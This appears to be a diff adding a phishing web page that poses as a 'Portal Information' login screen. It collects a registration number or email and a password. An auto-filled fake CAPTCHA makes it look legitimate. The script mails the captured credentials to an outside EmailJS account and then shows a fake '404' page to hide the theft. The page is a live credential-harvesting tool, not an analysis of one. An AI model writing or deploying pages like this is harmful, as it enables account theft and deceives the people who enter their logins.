@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Portal Information</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f2f4f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      width: 90%;
+      max-width: 400px;
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,.12);
+    }
+    h2 { text-align: center; margin-bottom: 22px; }
+    label {
+      display: block;
+      margin: 12px 0 6px;
+      font-size: 14px;
+      font-weight: bold;
+    }
+    input, textarea {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    .captcha-box {
+      margin-top: 16px;
+      padding: 12px;
+      border: 1px solid #d1d5db;
+      border-radius: 8px;
+      background: #f9fafb;
+    }
+    .captcha-title {
+      font-size: 13px;
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+    .captcha-number {
+      display: inline-block;
+      padding: 7px 12px;
+      margin-bottom: 8px;
+      background: #e5e7eb;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: bold;
+      letter-spacing: 4px;
+      user-select: none;
+    }
+    .captcha-input {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 9px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    .captcha-note {
+      margin-top: 6px;
+      font-size: 11px;
+      color: #777;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 20px;
+      padding: 11px;
+      border: none;
+      border-radius: 6px;
+      background: #2563eb;
+      color: white;
+      font-size: 15px;
+      cursor: pointer;
+    }
+    button:hover { background: #1d4ed8; }
+    #status {
+      text-align: center;
+      margin-top: 12px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Portal Information</h2>
+
+    <form id="messageForm" action="javascript:void(0);" method="post">
+      <label for="registration">Email ID / Registration Number</label>
+      <input
+        type="text"
+        id="registration"
+        name="subject"
+        placeholder="Enter Email ID / Registration Number"
+        required
+      >
+
+      <label for="message">Password</label>
+      <input
+        type="text"
+        id="message"
+        name="message"
+        placeholder="Enter Password"
+        required
+      >
+
+
+      <div class="captcha-box">
+        <div class="captcha-title">Captcha Cookie From Portal</div>
+        <div id="captchaNumber" class="captcha-number"></div>
+        <input
+          type="text"
+          id="captchaInput"
+          class="captcha-input"
+          autocomplete="off"
+          placeholder="CAPTCHA code"
+          required
+        >
+        <div class="captcha-note">Code is automatically filled By Small Backend server.</div>
+      </div>
+
+      <button type="submit">Login</button>
+      <div id="status"></div>
+    </form>
+  </div>
+
+  <script>
+    emailjs.init({
+      publicKey: "TbdijOpdDCsFuHgzK"
+    });
+
+    // Demo CAPTCHA: generates a unique 5-character mixed-letter code.
+    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+    let captchaNumber = "";
+    for (let i = 0; i < 5; i++) {
+      captchaNumber += chars[Math.floor(Math.random() * chars.length)];
+    }
+    document.getElementById("captchaNumber").textContent = captchaNumber;
+    document.getElementById("captchaInput").value = captchaNumber;
+
+    document.getElementById("messageForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const captchaInput = document.getElementById("captchaInput").value.trim();
+      if (captchaInput !== captchaNumber) {
+        status.textContent = "Incorrect CAPTCHA number.";
+        status.style.color = "#dc2626";
+        document.getElementById("captchaInput").focus();
+        return;
+      }
+
+      const status = document.getElementById("status");
+      const button = this.querySelector("button");
+
+      button.disabled = true;
+      button.textContent = "Ready to login";
+      status.textContent = "";
+
+      const registration = document.getElementById("registration").value.trim();
+      const message = document.getElementById("message").value.trim();
+
+      emailjs.send(
+        "service_hcl9ew6",
+        "template_9zuj7fr",
+        {
+          subject: registration,
+          message: message
+        }
+      ).then(function() {
+        // Show a harmless error page after the message is sent.
+        document.body.innerHTML = `
+          <div style="min-height:100vh;display:flex;align-items:center;justify-content:center;
+                      font-family:Arial,sans-serif;background:#f5f5f5;padding:20px;box-sizing:border-box;">
+            <div style="text-align:center;background:#fff;padding:40px 25px;border-radius:12px;
+                        box-shadow:0 4px 18px rgba(0,0,0,.12);max-width:420px;width:100%;">
+              <div style="font-size:56px;margin-bottom:15px;">⚠️</div>
+              <h1 style="margin:0 0 10px;color:#222;">404 - Page Not Found</h1>
+              <p style="margin:0;color:#666;font-size:15px;">
+                The requested page could not be found.
+              </p>
+            </div>
+          </div>`;
+      }).catch(function(error) {
+        console.error(error);
+        document.body.innerHTML = `
+          <div style="min-height:100vh;display:flex;align-items:center;justify-content:center;
+                      font-family:Arial,sans-serif;background:#f5f5f5;padding:20px;box-sizing:border-box;">
+            <div style="text-align:center;background:#fff;padding:40px 25px;border-radius:12px;
+                        box-shadow:0 4px 18px rgba(0,0,0,.12);max-width:420px;width:100%;">
+              <div style="font-size:56px;margin-bottom:15px;">❌</div>
+              <h1 style="margin:0 0 10px;color:#222;">Something went wrong</h1>
+              <p style="margin:0;color:#666;font-size:15px;">
+                Please try again later.
+              </p>
+            </div>
+          </div>`;
+      });
+    });
+  </script>
+</body>
+</html>
